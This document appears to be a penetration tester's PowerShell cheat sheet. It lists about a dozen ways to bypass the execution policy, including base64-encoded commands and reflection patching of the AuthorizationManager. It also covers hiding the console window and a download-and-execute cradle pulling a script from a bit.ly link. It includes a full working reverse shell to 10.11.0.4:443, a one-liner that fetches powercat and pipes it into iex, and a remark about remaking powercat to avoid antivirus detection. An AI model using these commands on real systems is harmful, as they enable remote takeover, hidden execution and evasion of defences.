# installed by default:
#   PowerShell 3.0
#     Win 8 / Win Svr 2012
#     Win 7 SP1 / Win Svr 2008 R2 SP1/SP2
#   PowerShell 4.0
#     Win 8.1 / Win Svr 2012 R2
#   PowerShell 5.0
#     Win Svr 2016

# PowerShell contains built-in IDE known as:
# Windows PowerShell Integrated Scripting Environment (ISE)

# get help
powershell -?

# begin without profile (analogous to bash `~/.profile`)
powershell -NoProfile
# notice powershell commands are all case-insensitive
powershell -noprofile
# and there are abbreviations for many options and commands
powershell -nop
# and you can also hide the window
# CAUTION: if you are already in a cmd window, this will hide that too, lol
# possible values here are: `normal`, `hidden`, `minimized`, `maximized`
powershell -nop -w hidden


# check powershell version (many variations; none from cmd) ie. from powershell repl
$psversiontable
$PSVersionTable.PSVersion
$host
$host.Version
(Get-Host).Version

# default execution policy is
#  "Restricted" for Windows
#    meaning cannot:
#      load configuration files
#      execute scripts
#  "RemoteSigned" for Windows Server
#    meaning scripts also require a trusted signature

# this "safety" feature is a paper-thin and MSFT provides several simple ways to bypass it.
# see: https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/
#
# 1) if you have gui, copy-paste script directly into powershell REPL
# 2) echo script into powershell stdin ie. from cmd
echo write-host "hello world" | powershell -nop -
echo write-host "hello world" > a.ps1
type a.ps1 | powershell -nop -
# 3) read file and execute via powershell repl
#    note the subtly different requirement of quotes in powershell vs cmd
echo 'write-host "hello world"' | powershell -nop -
get-content a.ps1 | powershell -nop -
get-content a.ps1 | iex
gc a.ps1 | iex
# 4) download script and Invoke-Expression (iex)
powershell -nop -c "iex(new-object net.webclient).downloadstring('http://bit.ly/1kEgbuH')"
# 5) use the command flag ie. from cmd
powershell -c "write-host 'hello world'"
# 6) base64 encode the command (MY FAVORITE!)
cat <<! | iconv -f ascii -t utf-16le | base64
write-host "hello world"
!
dwByAGkAdABlAC0AaABvAHMAdAAgACIAaABlAGwAbABvACAAdwBvAHIAbABkACIACgA=
powershell -nop -e dwByAGkAdABlAC0AaABvAHMAdAAgACIAaABlAGwAbABvACAAdwBvAHIAbABkACIACgA=
# 7a) powershell, when powershell remoting enabled (against self)
invoke-command -scriptblock {write-host hello}
# 7b) p2p powershell, when powershell remoting enabled (against remote target)
invoke-command -computername Server01 -scriptblock {write-host hello}
# 9a) bypass feature of powershell, ie. as option to powershell.exe
#     notice: besides `bypass` there are also `unrestricted` and `remote-signed` options
#     but they are not useful for our purposes
powershell -executionpolicy bypass -file a.ps1
powershell -nop -executionpolicy bypass
PS> . .\powercat.ps1
# 9b) bypass as configuration at runtime, ie. from powershell repl
PS> set-executionpolicy bypass -scope process
# 9c) this setting can also be changed via registry 
#     and it will persist for the user
#     may not count as a disk/file read/write even though registry is on filesystem
PS> Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
# HKEY_CURRENT_USER\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell\ExecutionPolicy UnRestricted
# 12) monkey-patch the AuthorizationManager, 
#     lasting remainder of existing powershell session
PS> function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}
Disable-ExecutionPolicy
.\a.ps1


# simple reverse shell
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();

# `powercat.ps1`
# powercat is a pure-powershell netcat implementation
# on kali, you can get the script
sudo apt install -y powercat
cd /usr/share/windows-resources/powercat
# but ideally you'd host it somewhere or otherwise
# d/l and execute this ps1 from the remote machine
(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') | iex
powercat -h
# notice: powercat is a large script and likely well signatured by AV
# (but if someone were to remake it, it's likely to be undetected?)
# ie. if we remade it more like socat or bash pipe with basic cipher support...


